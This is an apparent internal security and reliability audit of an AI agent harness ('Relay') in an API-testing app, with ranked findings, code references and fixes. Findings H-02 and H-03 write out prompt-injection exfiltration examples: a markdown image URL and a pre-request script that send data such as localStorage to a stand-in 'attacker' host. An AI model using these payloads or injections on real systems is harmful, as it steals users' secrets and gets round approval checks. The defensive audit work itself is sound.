# Relay harness audit

Date: 2026-11-02 · Branch: `feature/ai-agent` (HEAD `ee68d0b`) · Report only: no code was changed.

## Scope and method

- **Scope:** the agent runtime and the Relay UI that exposes it:
  - the chat route, guard and rate limit, and the system prompt;
  - the tool registry and schemas, approval, and the step cap and token budget;
  - redaction, the network tools, and the change log and Undo;
  - thread persistence, the conversation and the cards.
- **Not in scope:** the build-phases/e2e dev workflow.
- **Yardstick:** the promises in `agent_docs/relay-polish/SPEC.md` (RP-2xx), `agent_docs/relay-v2/SPEC.md` (TOOL/CONV/BUG/BAK) and `agent_docs/relay-conversation-polish/SPEC.md` (R1–R7), plus how the code actually behaves.
- **Method:**
  - A mechanical consistency matrix over all 74 tools. Every tool has an implementation, a capability category, and en/fr running/done labels, so there is no registry drift.
  - Five parallel deep reads: server loop, write tools vs Undo, approval and security, UI, and spec traceability with tool-surface design.
- **Ranking:** severity × likelihood, weighted equally across workspace correctness, agent reliability and security.
- **Confidence:**
  - **CONFIRMED (re-read)**: the main auditor re-opened the cited lines.
  - **CONFIRMED**: the sub-auditor traced the code path, but the main auditor did not re-open it.
  - **PLAUSIBLE**: suspected but not fully traced.
  - None of these were reproduced by running a test.
- **Line numbers** refer to HEAD `ee68d0b` and drift as code changes. Re-check them before fixing.

## Headline

The registry's approval logic is sound:
- Tokens are branded and minted only on a click.
- Flipping the mode while a card is pending is safe.
- `import_backup` is merge-only and never sees the file.
- Context and response fences hold.
- The step-cap math is exactly 12.

The weak points are elsewhere:
1. **Turn lifecycle (Stop, Retry, thread switch).** Stop does not end the loop. Retry replays the whole turn's writes. Queued tools write into whichever thread is current when they run.
2. **"Auto" tools that are not low-risk.** Script writes, Share variable values, TLS off, global base URL and downloads all run without asking in Review mode. Combined with images in markdown that load on their own, this gives a zero-click way for a prompt injection to send data out.
3. **Undo fidelity.** Undo misses the collection's chain, the active environment and open-tab copies.
4. **Tool-surface ergonomics for the model.**
   - Reads and writes use different shapes.
   - Catalog slugs must be guessed.
   - All 74 tools (about 14k tokens) are sent on every step.
   - Some reads are missing.

## Ranked findings

| # | ID | Title | Concern | Sev | Lik | Conf |
|---|----|-------|---------|-----|-----|------|
| 1 | H-01 | Stop does not end the turn; the tool loop resubmits | reliability | high | high | CONFIRMED (re-read) |
| 2 | H-02 | Markdown images load on their own (zero-click exfiltration) | security | high | med | CONFIRMED (re-read) |
| 3 | H-03 | `set_request_scripts` is auto; the code runs via `new Function` on the next Send | security | high | med | CONFIRMED (re-read) |
| 4 | H-04 | The model can turn on "Share variable values" without approval | security | high | med | CONFIRMED (re-read) |
| 5 | H-05 | Retry/Regenerate replays every tool step of the turn, so writes are duplicated | correctness | high | med | CONFIRMED (re-read) |
| 6 | H-06 | Queued tools take the thread and turn at run time; a thread switch mid-run misroutes changes and Undo | correctness | high | med | CONFIRMED (re-read) |
| 7 | H-07 | A Relay edit to a request that is open in a tab is overwritten by the next Save | correctness | high | med | CONFIRMED (re-read) |
| 8 | H-08 | The model's daily cap and rate limit can be bypassed; `/api/ai` uses the server key with no guard | security | high | med | CONFIRMED (re-read) |
| 9 | H-09 | Undo of `delete_collection` doesn't restore the collection's chain | correctness | high | low | CONFIRMED (re-read) |
| 10 | M-00 | The model must guess `import_api_catalog` slugs, so the import fails after approval | reliability | med | high | CONFIRMED |
| 11 | M-01 | Auto tools get no AbortSignal, and Stop is hidden while they run | reliability | med | med | CONFIRMED |
| 12 | M-02 | Read and write vocabularies differ for body types and auth | reliability | med | high | CONFIRMED (re-read) |
| 13 | M-03 | All 74 tools (~14.4k tokens) are sent on every step | reliability | med | high | CONFIRMED |
| 14 | M-04 | Redaction misses common credential formats; curl `-u token:` username is stored as a literal | security | med | med | CONFIRMED |
| 15 | M-05 | Global base URL and headers are auto and unvalidated; the send card host ignores the base URL; `send_request` refuses relative URLs | security / reliability | med | med | CONFIRMED |
| 16 | M-06 | `update_proxy_settings{sslVerify:false}` is auto; `proxyUrl` is a no-op | security | med | low | CONFIRMED |
| 17 | M-07 | In skip mode, deleting a request with a dirty tab can never succeed | reliability | med | med | CONFIRMED |
| 18 | M-08 | "Open in Relay" prefills raw response headers and body as user text (unredacted, unfenced) | security | med | med | CONFIRMED |
| 19 | M-09 | Catalog import differs from the Hub UI, has no already-imported check, and can fail half-written | correctness | med | med | CONFIRMED |
| 20 | M-10 | Multi-item deletes that fail partway keep the deletes already done but report an error | correctness | med | med | CONFIRMED |
| 21 | M-11 | `import_backup` records no change, so it gets no card and no Undo | correctness | med | med | CONFIRMED |
| 22 | M-12 | `duplicate_chain` copies collection scope, so the copy is hidden; `duplicate_collection` drops the chain | correctness | med | med | CONFIRMED |
| 23 | M-13 | Undo of `delete_environment` leaves no environment active | correctness | med | med | CONFIRMED |
| 24 | M-14 | "Save all & close" and dirty-gate save drop assertions | correctness | med | med | CONFIRMED |
| 25 | M-15 | No read-after-write for assertions, timeout, SSL or redirects; no history list; folders unsearchable | reliability | med | med | CONFIRMED |
| 26 | M-16 | "One logical change at a time", a 12-step cap and no batch create, so large builds hit the cap | reliability | med | med | CONFIRMED |
| 27 | M-17 | Nullable-but-required fields with no strict mode, so validation retries burn steps | reliability | med | med | PLAUSIBLE |
| 28 | M-18 | Overlapping tools (`delete_request`/`delete_requests`, collection tools vs folder tools) | reliability | med | med | CONFIRMED |
| 29 | M-19 | A `graphql` body type is stored as JSON without the promised wrapping | correctness | med | med | CONFIRMED |
| 30 | M-20 | Sending while an auto tool runs loses its result and ChangeCard | reliability | med | med | CONFIRMED |
| 31 | M-21 | Partial reply lost on thread switch or tab close mid-stream | reliability | med | med | CONFIRMED |
| 32 | M-22 | After reload, an approved call that ran shows "Declined automatically" | correctness | med | low | CONFIRMED |
| 33 | M-23 | Regenerate or Edit & resend hide applied writes that "Undo all" still covers | correctness | med | low | CONFIRMED |
| 34 | M-24 | Permission mode and Enable aren't synced across browser tabs | security | med | low | CONFIRMED |
| 35 | M-25 | STT route has no rate limit and buffers the upload before the size check | security | med | med | CONFIRMED |
| 36 | M-26 | Current turn is never trimmed, so a long loop can 413 with "edit your message" | reliability | med | low | PLAUSIBLE |
| 37 | M-27 | Scope list omits history, folders, tabs and catalog | reliability | med | low | CONFIRMED |
| — | L-xx | 23 low findings, listed below | | low | | |

---

## High

### H-01 Stop does not end the turn
- **Evidence:**
  - `src/hooks/useRelayChat.ts:127-136`: `shouldContinueToolLoop` checks only `lastAssistantMessageIsCompleteWithToolCalls` and the step count. It never reads `finishReasonRef`.
  - `stopTurn` (`:847-859`) aborts and calls `stop()`, but a queued tool still calls `addToolOutput` (`:426-430`).
  - The SDK's `addToolOutput` auto-submits when the status is `ready` (`node_modules/ai/dist/index.mjs:~13217`).
  - The spec `useRelayChat.spec.ts:1127-1139` even mocks the follow-up turn.
- **Failure:** the user presses Stop during an approved `run_chain`. The tool returns, the model keeps calling tools, and the turn has no timing.
- **Fix:**
  - Keep a `stoppedRef` that is set in `stopTurn` and cleared on send and regenerate.
  - Have `sendAutomaticallyWhen` return false when it is set.
  - Add a spec asserting the fetch count.

### H-02 Markdown images load on their own
- **Evidence:**
  - `src/components/relay/RelayMarkdown.tsx:100-134`: `COMPONENTS` has no `img` override.
  - `allowRelayUrl` passes any https URL through `defaultUrlTransform`.
  - There is no CSP.
- **Failure:** an injected response body makes the model reply with `![](https://attacker/x?d=<data>)`. The browser requests that URL the moment the reply renders. This chains with H-03, H-04 and M-04.
- **Fix:**
  - Override `img` to render the alt text, or a link that needs a click.
  - Add a spec for markdown image syntax.
  - Optionally add a CSP `img-src 'self' data:`.

### H-03 Script writes are auto and run with full page access on the next Send
- **Evidence:**
  - `src/lib/relay/tools/schemas.ts:609-618` marks the tool `kind:"auto"`, and its description says scripts are "never run by this tool".
  - They do run on the user's next Send, through `scriptRunner.ts:136-139` (`new Function`), from `useSendRequest.ts:142,238`.
- **Failure:** an injected instruction stores `fetch('https://attacker/?'+JSON.stringify(localStorage))` as a pre-request script.
- **Fix:**
  - Treat script writes as approval-required in Review mode, and show a script diff on the card.
  - Refuse literal secrets in script text.
  - Fix the description.

### H-04 The model can turn on "Share variable values"
- **Evidence:**
  - `schemas.ts:778-787`: `set_relay_preferences` is auto.
  - `approvalNeeded` (`:963-967`) asks only for `enabled:false`.
  - `settingsWrite.ts:152-164` applies the change immediately.
  - The redaction context is rebuilt on every call (`useRelayChat.ts:~400`), so the next `get_environment` in the same turn returns real values.
- **Spec:** promise 6, which says values are shared only when the *user* turns this on.
- **Fix:** remove `shareValues` from the tool (it is a user-only privacy switch, like the deny-list items), or require approval in every mode when it changes to true.

### H-05 Retry/Regenerate replays the whole turn
- **Evidence:**
  - `useRelayChat.ts:861-866` calls the SDK `regenerate()`, which drops the whole last assistant message, including completed tool steps.
  - It is wired to both Retry and Regenerate (`RelayDock.tsx:118,129`).
  - When the step cap is hit, the route returns `tool_failed`, which offers Retry (`route.ts:179-182`, `errors.ts:43`).
- **Failure:** three `create_request` calls succeed, step 4 errors, and the user clicks Retry. The collection now holds 6 requests.
- **Fix:**
  - Retry should resend from the last completed tool step without dropping finished tool parts.
  - Regenerate should warn when the turn has applied changes, or offer "Undo and regenerate".
  - Add a `step_limit` error code with no Retry.

### H-06 Thread switch mid-run misroutes tool writes
- **Evidence:**
  - `useRelayChat.ts:484-503`: `enqueueTool` reads `chatIdRef.current`, `messagesRef.current` and `addToolOutputRef.current` *when the queued tool runs*, not when it was called.
  - The thread list stays usable mid-run (`ThreadList.tsx:344-362`).
  - The change log keys Undo by thread and turn (`changeLog.ts:690-693`).
- **Failure:** the user switches threads while a tool is queued. The change is attributed to the new thread, its output is dropped, and the new thread's "Undo all" reverts it silently.
- **Fix:** capture `threadId`, `turnId`, attachments and `addToolOutput` inside `onToolCall` and pass them into the queue. Alternatively, block thread switching or require Stop while a turn is live.

### H-07 Relay edits to an open request are lost on the next Save
- **Evidence:**
  - `requestWrite.ts:218-229` writes only the store request.
  - The writer `putRequest` (`changeLog.ts:789-794`) calls `useCollectionsStore.updateRequest`, which updates only the request (`useCollectionsStore.ts:437-445`). Tabs keep their own copy of the URL, headers and body, and nothing syncs them from the store, so even a clean tab goes stale.
  - `hooks/useSaveRequest.ts:31-43` writes the tab's stale copy back over it.
  - Undo is then blocked by the conflict.
- **Fix:**
  - Have request writes also patch the clean open tab, or mark the tab "changed outside the editor" and refuse to save over it.
  - If the tab is dirty, route the edit through the existing confirm gate.

### H-08 Model spend can bypass the cap; `/api/ai` is unguarded
- **Evidence:**
  - `src/lib/relay/server/guard.ts:92` returns ok with no metering when the last message isn't from the user.
  - The daily scope uses the client-set `x-relay-user` header when it is present (`:111`), so rotating the header resets the cap, and the IP daily cap is never checked then.
  - `isSameOrigin` passes when no Origin header is sent (`:44-53`).
  - `src/app/api/ai/route.ts:107-137` has no flag check, origin check, rate limit, zod validation or `maxOutputTokens`, and it keeps working when Relay is disabled by flag (BUG-05).
- **Fix:**
  - Meter every model call, including tool continuations, at a lower weight.
  - Always enforce the IP daily cap.
  - Use a trusted client-IP source.
  - Require a same-origin signal.
  - Run the shared guard on `/api/ai`.

### H-09 Undo of delete_collection loses its chain
- **Evidence:**
  - `stores/useCollectionsStore.ts:409-410` cascades `deleteChain(id)`.
  - The tree adapter restores only the collection, folders and requests (`changeLog.ts:248-259`).
- **Fix:** capture the chain in `captureTree` and restore it.

## Medium

- **M-00 Catalog slug must be guessed.**
  - Evidence: `schemas.ts:866` takes `slug: z.string()`, and no tool lists the valid slugs. The card shows the raw guess (`catalogTools.ts:48-53`). The real slugs are folder names under `public/data/hub`.
  - Failure: "add the Clerk API" produces `clerk`, and the import fails after the user approves. The workspace is not damaged, but the approval was wasted.
  - Fix: build an enum from the hub index, or add a `list_api_catalog` read tool. Validate the slug before showing the card (see L-06).
- **M-01 Auto tools can't be aborted.**
  - Evidence: `onToolCall` → `enqueueTool(toolCall)` with no grant (`useRelayChat.ts:557-561`), so `network.ts:204` falls back to a signal nothing can abort. The status reads "ready", so the composer shows Send instead of Stop (`RelayDock.tsx:99`).
  - In skip mode this covers `send_request` and `run_chain`.
  - Fix: give every queued call an AbortController and count running auto tools in `approvedRunning`.
- **M-02 Read and write shapes differ.**
  - Writes use `form`, `apikey`, `keyName` and `keyValue` (`schemas.ts:40-48,138-146`).
  - Reads return `form-data`, `xml`, `html`, `api-key`, `key` and `value` (`workspaceRead.ts:191-217`).
  - `xml` and `html` bodies can't be written.
  - Fix: one shared vocabulary in `schemas.ts`, used by both directions.
- **M-03 Tool payload on every step.**
  - `route.ts:57-65,185-197` sends all 74 tools (about 50k characters, ~14.4k tokens). That is about 170k tokens for a 12-step turn, and a large tool menu lowers the model's tool-choice accuracy.
  - Fix:
    - Use a core set plus topic groups, chosen by `prepareStep`/`activeTools`, slash command or attachment kind.
    - Shorten the longest descriptions (`add_chain_node` is 2.5k characters).
- **M-04 Redaction gaps.**
  - `redact.ts:18,47-57` misses `Authorization: Token …`, lowercase `basic`, `sk_test_`/`sk_live_`, `glpat-`, and `?key=`/`access_key` inside `redactDeep`. Scripts only go through `redactValue` (`workspaceRead.ts:219-220`).
  - `curl.ts:317-322` replaces only the password, so `curl -u sk_test_…:` (the form Stripe's docs use) stores the key as a literal, and `buildCurl` (`:371`) then echoes it back.
  - Fix: add these cases to `redact.corpus.ts` and the patterns; treat a token-shaped basic-auth username as a secret.
- **M-05 Global base URL.**
  - `settingsWrite.ts:129-147` stores `baseUrl` without running `urlProblem` and accepts `{{token}}` header values, all as auto.
  - The send card host comes from `request.url` alone (`network.ts:108-115`), so it hides the real destination.
  - `send_request` checks the scheme before the base URL is prepended (`network.ts:142-148` vs `utils.ts:105-112`), so requests with relative URLs that work from the Send button are refused.
  - Fix:
    - One `resolveSendTarget()` shared by the card and the send.
    - Require approval for base URL changes.
    - Validate `baseUrl`.
- **M-06 TLS off is auto.**
  - `update_proxy_settings{sslVerify:false}` is auto (`schemas.ts:759-768`).
  - `proxyUrl` is never read by the request runner.
  - Fix: require approval when `sslVerify` changes to false; wire `proxyUrl` in or drop it.
- **M-07 Skip mode with a dirty tab.**
  - Only the close-tab tools register a confirm gate (`tabs.ts:212-217`). The delete tools get `DECISION_REQUIRED` (`tabs.ts:151-160`), and no card appears in skip mode.
  - Fix: register the dirty-tab gate on the delete tools, so it shows in every mode as RP-221 already intends.
- **M-08 "Open in Relay" prefill.**
  - `ResponsePanel.tsx:662-668` puts raw headers and body into the composer, and user text is never redacted (`redact.ts:351-355`).
  - So `set-cookie` values leak, and injected text arrives as the user's own words.
  - Fix: attach the response as a pill (fenced and redacted) and prefill only the instruction.
- **M-09 Catalog import.**
  - `catalogTools.ts:54-93` skips `getImportedSlugs()`, which the UI checks (`HubProviderCard.tsx:135-144`).
  - It takes a different path from the Hub import and can fail after the collection is written.
  - Fix: reuse the Hub import function; refuse duplicates.
- **M-10 Partial multi-delete.**
  - `destructive.ts:186-197` keeps the deletes it already made but returns a failure, so the model believes nothing happened.
  - Fix: validate every id first (all or nothing), or return a partial result with the change ids.
- **M-11 `import_backup` has no Undo.**
  - `backupTools.ts:127-143` records no change.
  - TOOL-04 says every write op has Undo.
  - Fix: record the merged entity ids as one change.
- **M-12 Duplicates of chains.**
  - `duplicateTools.ts:99-104` copies `scope:"collection"`, which hides the copy from the chain list and search.
  - `duplicate_collection` doesn't copy the chain.
  - Fix: make chain copies standalone (R1); copy the chain on collection duplicate.
- **M-13 Undo of delete_environment.**
  - `destructive.ts:241-249` doesn't restore the active-environment pointer.
  - Fix: record `wasActive` in the snapshot and call `setActive` on restore.
- **M-14 Assertions dropped on save.**
  - The save behind "Save all & close" and the dirty gate (`tabs.ts:111-125`) leaves out `assertions`, which `useSaveRequest` includes.
  - Fix: share one save function.
- **M-15 Read-after-write gaps.**
  - `get_request` leaves out assertions, timeout, SSL and redirects (`workspaceRead.ts:201-222`).
  - `get_tab_request` refuses HTTP tabs (`tabRequests.ts:211`), so `generate_tests` output can't be verified.
  - No tool lists history, although `diff_responses` takes history positions.
  - Folders can't be searched.
  - Fix: return the full request from `get_request`, let `get_tab_request` read HTTP tabs, add `list_history`, and include folders in search.
- **M-16 Batch limits.**
  - `systemPrompt.ts:17` says "at most one logical change at a time", there is a 12-step cap, and there is no batch create.
  - So "build a 15-request collection" can't finish.
  - Fix: allow independent calls in one step, or add `create_requests` (batch, bulk-approval aware).
- **M-17 Nullable but required fields.**
  - `add_chain_node.block` needs 11 keys (`schemas.ts:179-194`) and strict tool mode is off (`model.ts:12-14`).
  - Fix: fill missing nullable keys with null before validation. *PLAUSIBLE.*
- **M-18 Overlapping tools.**
  - `delete_request` and `delete_requests` have identical inputs (`schemas.ts:669-684`).
  - `create_collection`/`rename_collection` take a `parentId` that duplicates the folder tools (`:411-418,842-859`).
  - `delete_requests_in_collection.collectionId` also accepts a folder id.
  - Fix: one tool per intent; use the input name `parentId`.
- **M-19 GraphQL body type.**
  - `requestWrite.ts:55,205` maps `graphql` to `json` without the `{query, variables}` wrapping that the description (`schemas.ts:600`) promises.
  - Fix: wrap it as `{query, variables}`, or drop `graphql` from `BODY_TYPES`.
- **M-20 Send while an auto tool runs.**
  - `send` (`useRelayChat.ts:710-730`) calls `sendMessage` while a tool from `enqueueTool` (`:484-503`) is still pending. Its later `addToolOutput` lands on a message that is no longer the last one, so the output and ChangeCard are lost and the row spins forever.
  - Fix: disable Send while queued tools are pending, or make Send stop and settle first. This is part of theme 1.
- **M-21 Partial reply lost.**
  - The thread save skips while streaming (`useRelayChat.ts:746`: `if (status === "streaming" ...) return`), so a thread switch or tab close loses the in-progress reply.
  - The CONV-11 comment claims more than the code does.
  - Fix: save a throttled partial snapshot while streaming, and flush on `pagehide` and on thread switch.
- **M-22 Ran but shown as declined.**
  - On restore, `declinePendingTools(thread.messages)` (`useRelayChat.ts:636`, defined `:215`) marks every call without an output as `autoDeclined` (`:144`). That includes calls that were approved and had started.
  - Fix: persist a "running" marker when an approved call starts, and settle it on restore as "interrupted — may have applied", with a link to the change log.
- **M-23 Hidden writes under Undo all.**
  - `editAndResend` (`useRelayChat.ts:833`) and `regenerate` cut the messages that carry the ChangeCards, but the change-log entries for that turn stay, so "Undo all" reverts changes the user can no longer see.
  - Fix: before cutting, show the applied changes and offer "Undo them" or "Keep them". Re-key kept changes to the new turn.
- **M-24 No cross-tab sync.**
  - `useRelayPermissionStore.ts:23-43` and `useRelayStore.ts:186-209` read and write localStorage only at load and on set. Neither file has a `storage` event listener.
  - Tightening the mode, or disabling Relay, in one tab doesn't reach another open tab.
  - Fix: add a `storage` listener that rehydrates the mode and `enabled`, or read the mode from storage at `onToolCall`.
- **M-25 STT route.**
  - `stt/route.ts:42-61` calls `req.formData()` before any size check and has no rate limit.
  - Fix: check Content-Length first; use the shared limiter.
- **M-26 Current turn never trimmed.**
  - `tokenBudget.ts:116-119` always keeps the latest turn, whose tool results can reach 16k characters each.
  - Fix: compact older tool outputs within the current turn. *PLAUSIBLE.*
- **M-27 Scope list.**
  - The scope list at `systemPrompt.ts:9` omits history, folders, tabs and the API catalog.
  - The strict scope rules may then decline "export my history".
  - Fix: build the scope list from the tool categories so it can't drift from the registry.

## Low

- **L-01** `systemPrompt.ts:18` promises a confirmation card, and descriptions at `schemas.ts:672,781` say "must approve first". Neither is true in skip mode, and the prompt is never told the mode. Fix: put the mode in the per-request context, or reword.
- **L-02** The scope guard relies on the prompt alone, and all tools are always sent (`route.ts:185-197`). Combined with H-08, a direct caller can prefill assistant turns. Fix: drop client-sent assistant turns the server didn't produce, or sign them; the topic-based tool loading in theme 5 also narrows this.
- **L-03** Restored threads leave auto tool calls without results spinning forever (`useRelayChat.ts:200-203,636`). `ignoreIncompleteToolCalls` hides them from the model, so it never learns the write happened. Fix: settle them as "interrupted" on restore.
- **L-04** `diff_responses` output (`smart.ts:115-127`) is neither fenced nor marked untrusted. WebSocket message data is marked untrusted but not fenced (`tabRequests.ts:196-200`). Fix: wrap both in the shared response fence.
- **L-05** `export_history` (unredacted) and `export_postman` download files with no approval, unlike `export_backup` (`schemas.ts:723-728,860-865`). Fix: make both confirm (part of theme 2).
- **L-06** Approval cards render before ids are checked (`MessageParts.tsx:105`, `registry.ts:217-223`), so the user can be shown a "Delete 0" card. Fix: run a `validate(input)` step before the card and fail fast on unknown ids.
- **L-07** `redactEnvironment` (`redact.ts:308-323`) and `describeEnvironment` (`workspaceRead.ts:402-419`) return different shapes. Fix: derive one from the other.
- **L-08** speechEngine and "Grok" remnants:
  - Still present in the model-visible schema, the error text and the undo adapter: `schemas.ts:71,781`, `settingsWrite.ts:28-29`, `changeLog.ts:428-434`.
  - Grok/xAI also still shows in the UI locales.
  - These are planned for conversation-polish R7/D5 (later phase), so they are a tracking item, not a regression. Note that the model-visible "Grok" text can still be repeated in chat today.
  - Fix: in R7, remove `"grok"` from `SPEECH_ENGINES` first, since that is the text the model sees.
- **L-09** Switching from no environment is labelled "Created 1 environment" (`environmentWrite.ts:222`, `changesSummary.ts:47-48`). Fix: give active-environment changes their own `action` instead of inferring "created" from `before === null`.
- **L-10** The pending "turn Relay off after this reply" is held only in memory and lost on reload (`useRelayChat.ts:792-794`). Fix: persist it with the thread, or apply it immediately when the reply ends.
- **L-11** `import_curl` silently uses the first collection when none is given (`smart.ts:69`). Fix: require one, or ask.
- **L-12** Unknown ids report success with "0 requests" (`destructive.ts:95-105`, `requestWrite.ts:488`). Fix: fail when nothing matches, listing the unknown ids.
- **L-13** `move_item` has no manual-UI counterpart: no drag/drop or move handler exists in the collection tree (only the tab bar and chain panels have drag code). TOOL-04 says "do not invent tools", and the folder order can collide (`collectionWrite.ts:175`, `order: index ?? siblingCount(...)`). Fix: either add a move action to the tree UI and have both use one store action that re-indexes siblings, or remove the tool.
- **L-14** Undo of a tab-only edit leaves the tab dirty, and tab-only edits are lost on reload (`tabRequests.ts:55-75`; the `tabRequest` adapter in `changeLog.ts`). Fix: restore `isDirty` with the snapshot. *PLAUSIBLE.*
- **L-15** An undo that throws partway leaves a half-restored state with no recorded status (`changeLog.ts:675-680`). Without IndexedDB, Undo is dead after reload. Undo doesn't reopen tabs a delete closed. Fix: restore all-or-nothing with a status on the change, show "Undo unavailable" when IndexedDB is missing, and record closed tab ids in the delete snapshot.
- **L-16** Two tabs on one thread overwrite each other's saves (`threadDb.ts:316-327`). Fix: compare a version or `updatedAt` before writing.
- **L-17** Two cards waiting at once are subtracted twice from active time (`timing.ts:109-113`). Fix: merge overlapping waiting intervals before summing.
- **L-18** Declining `import_backup` shows a red "Failed" row. Its error is `IMPORT_CANCELLED_ERROR` ("cancelled", `schemas.ts:901`), but `MessageParts.tsx:70` only checks for `USER_DECLINED_ERROR`. Fix: treat both as declined.
- **L-19** Raw English registry errors and internal ids reach the fr/ja UI through `ToolRow` `errorText` (`ToolRow.tsx:25`) and `MessageParts.tsx:229`. Fix: map error codes to i18n keys and keep the raw text for the model only.
- **L-20** `/run` says "request or chain" but has `requiresTarget: "request"` (`slashCommands.ts:192-198`). Fix: support a chain target, or reword the description.
- **L-21** The turn Changes bar counts only `changeId` and ignores `changeIds` (`MessageParts.tsx:231-235`). A delete of 3 collections shows as 1, although "Undo all" reverts all 3. Fix: count `changeIds`. Unlike the rest of R4 grouping, which is planned, this is a bug in code that has already shipped.
- **L-22** Tool-surface nits:
  - `update_tab_request` tells the model to take `tabId` from `get_active_context` (`schemas.ts:559`), although the tab-create results already return a `tabId`. Fix: mention both sources.
  - `open_page.section` (`schemas.ts:791-794`) is accepted for any page but only means something for settings. Fix: reject it for other pages.
  - There is no folder entity link (`systemPrompt.ts:58`). Fix: add a `relay://folder/` pill.
  - `get_workspace_summary` (`schemas.ts:316`) repeats the snapshot already sent with each request, and search and summary can't be paged. Fix: drop the tool or make it return the paged detail the snapshot omits.
  - There are parity gaps (accent colour, timeout/SSL/redirect writes, pin, saving GraphQL). Fix: add them, or list them as limitations in the system prompt.
- **L-23** A step-cap rejection is reported as `tool_failed`, and Retry is offered (`route.ts:179-182`, `errors.ts:43`), so Retry replays the turn into the same cap. Fix: return a distinct `step_cap` code with a "Continue" action instead of Retry.

## Robustness opportunities (themes for the next epic)

1. **Turn lifecycle state machine.** Make turn state explicit (`idle → streaming → awaiting-user → running-tools → stopped | capped | errored`) and bind every queued tool to the thread and turn it was called in. This fixes H-01, H-05, H-06, M-01, M-20, M-21, M-22 and L-03 in one place.
2. **Risk-based approval, not kind-based.** Add a `risk(name, input)` layer so certain auto calls escalate to approval in Review mode:
   - script writes;
   - `shareValues → true`;
   - `sslVerify → false`;
   - base URL or header-template changes;
   - downloads.

   This fixes H-03, H-04, M-05, M-06 and L-05. Pair it with the H-02 image fix to close the exfiltration chain.
3. **One undo snapshot contract.** Have each entity adapter declare its dependents (chain ↔ collection, active environment, open tabs), with a property test that runs write → undo → deep-equals the store. This fixes H-09, M-11, M-12, M-13 and L-15.
4. **Symmetric tool I/O.** Use one shared vocabulary for reads and writes, make every write return what a follow-up read needs, and add the missing reads. This fixes M-02, M-15, M-19 and M-00.
5. **Tool loading by topic.** Use core tools plus topic groups, which cuts about 14k tokens per step and improves tool-choice accuracy. This fixes M-03 and helps M-16.
6. **Server metering as the only enforcement point.** Meter every model call, guard `/api/ai` and STT, and use a trusted IP source. This fixes H-08 and M-25.
7. **Live-model eval set.** Several promises (R6 scope, R1 "no collection for chains", BUG-03 no tool names) can only be checked against the real model. A small scripted eval run against DeepSeek with assertions on tool-call logs would turn these into repeatable checks.

## Checked and found sound

- Approval tokens are branded, minted only on a click and can't be reused.
- Flipping the mode while a card is pending is safe, because the decision is recorded per call.
- `import_backup` is merge-only, ignores `rq_relay_permission_mode`, and returns counts only.
- The workspace context fence strips forged fence tokens. Attachments and `get_last_response` are fenced.
- `relay://` pills only resolve existing ids. Raw HTML is not rendered. `export_curl` masks auth headers.
- The step-cap math is exactly 12 on server and client, and the notice matches.
- Clients can't inject a system role. Errors carry codes only, provider metadata is stripped, and telemetry stays local.
- All 74 tools have an implementation, a capability category and en/fr labels. en/fr/ja relay keys match.
- Double approval is guarded. Thread pruning at 50 is correct. 429 and offline errors are shown.
- `prompts/index.ts` is not a drift copy of `systemPrompt.ts`; it powers the inline AI actions.

## Out of scope and deliberately not flagged

- Streaming STT, LLM provider choice, cloud sync, backup encryption and scheduled backups.
- Relay being unable to change its own approval mode or wipe data. These are deny-list items by design.
- conversation-polish R3/R4/R5/R7 not yet built: Phases 2–6 are open in `agent_docs/relay-conversation-polish/TASKS.md`. Only the model-visible "Grok" text is noted (L-08).
- Test-suite quality.
- Two sub-auditor nits that did not hold up on re-check: `create_request` accepting `ws://` (the HTTP url rule rejects it; only the WebSocket/Socket.IO rules allow it, `schemas.ts:203-209`) and `close_tab` needing an unlisted `tabId` (`get_active_context` returns it).

## Appendix: sub-auditor IDs → report IDs

Five sub-auditors produced the raw findings: S (server loop), W (write tools vs Undo), A (approval and security), T (spec traceability and tool surface) and U (UI). Duplicates were merged.

| Area | Mapping |
|------|---------|
| S | S1→H-01 · S2→M-01 · S3→H-08 · S4→H-08 · S5→M-25 · S6→H-05 · S7→L-23 · S8→M-26 · S9→M-08 · S10→L-03 · S11→L-01 · S12→L-02 |
| W | W1→H-09 · W2→H-07 · W3→M-13 · W4→L-21 · W5→M-10 · W6→M-09 · W7→M-11 · W8→M-12 · W9→L-09 · W10→L-10 · W11→M-14 · W12→L-11 · W13→L-12 · W14→L-13 · W15→L-08 · W16→L-14 · W17, W18, W19→L-15 |
| A | A1→H-02 · A2→H-03 · A3→H-04 · A4, A5→M-05 · A6→M-06 · A7, A8→M-04 · A9→L-04 · A10→M-07 · A11→L-05 · A12→L-07 |
| T | T-1→M-00 · T-2→M-09 · T-3→M-02 · T-4→M-19 · T-5→M-18 · T-6→L-06 · T-7→M-03 · T-8→M-17 · T-9→M-16 · T-10→L-22 · T-11→M-15 · T-12→L-22 · T-13→M-27 · T-14→L-08 · T-15→out of scope · T-16→L-01 · T-17→L-11, L-22 · T-18→L-22 |
| U | U1→H-01 · U2→M-01 · U3→M-20 · U4→H-06 · U5→M-21 · U6→M-22 · U7→L-03 · U8→M-23 · U9→M-24 · U10→L-16 · U11→L-17 · U12→L-18 · U13→L-19 · U14→L-08 · U15→L-20 |
